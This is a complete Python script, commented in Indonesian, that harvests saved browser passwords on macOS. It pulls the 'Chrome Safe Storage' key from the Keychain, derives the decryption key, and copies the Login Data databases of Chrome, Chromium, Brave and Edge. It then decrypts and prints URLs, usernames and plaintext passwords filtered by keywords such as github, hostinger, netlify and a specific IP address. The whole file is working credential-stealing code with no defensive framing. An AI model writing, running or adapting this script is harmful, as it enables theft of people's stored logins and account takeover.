#!/usr/bin/env python3
"""Panen sandi tersimpan dari peramban berbasis Chromium di macOS."""
import glob, hashlib, os, shutil, sqlite3, subprocess, sys, tempfile

def kunci_keychain(service="Chrome Safe Storage"):
    try:
        return subprocess.check_output(
            ["security", "find-generic-password", "-w", "-s", service],
            stderr=subprocess.DEVNULL).strip()
    except Exception:
        return None

def buka(enc, kunci):
    if not enc:
        return ""
    data = enc[3:] if enc[:3] in (b"v10", b"v11") else enc
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    except ImportError:
        return "<butuh: pip install cryptography>"
    d = Cipher(algorithms.AES(kunci), modes.CBC(b" " * 16)).decryptor()
    try:
        out = d.update(data) + d.finalize()
    except Exception:
        return "<gagal dekripsi>"
    n = out[-1]
    if 1 <= n <= 16:
        out = out[:-n]
    return out.decode("utf-8", "replace")

def profil():
    for b in ("~/Library/Application Support/Google/Chrome",
              "~/Library/Application Support/Chromium",
              "~/Library/Application Support/BraveSoftware/Brave-Browser",
              "~/Library/Application Support/Microsoft Edge"):
        for p in glob.glob(os.path.expanduser(b) + "/*/Login Data"):
            yield p

def main():
    cocok = [x.lower() for x in (sys.argv[1:] or
             ["liqu", "netlify", "93.127.133.160", "hostinger", "github",
              "juraganit", "waspadaweb", "persaudaraan"])]
    kb = kunci_keychain()
    if not kb:
        print("Keychain 'Chrome Safe Storage' TIDAK terbaca")
        return
    kunci = hashlib.pbkdf2_hmac("sha1", kb, b"saltysalt", 1003, 16)
    total = 0
    for p in profil():
        tmp = os.path.join(tempfile.gettempdir(), "logindata_panen.db")
        try:
            shutil.copy2(p, tmp)
        except Exception:
            continue
        c = sqlite3.connect(tmp)
        try:
            for r in c.execute("select origin_url, username_value, password_value from logins"):
                url, user, pw = r[0] or "", r[1] or "", r[2] or b""
                if not any(x in url.lower() for x in cocok):
                    continue
                print("%-44s %-26s %s" % (url[:44], user[:26], buka(pw, kunci)))
                total += 1
        except Exception as e:
            print("  gagal baca %s: %s" % (p, e))
        c.close()
    print("total cocok:", total)

main()
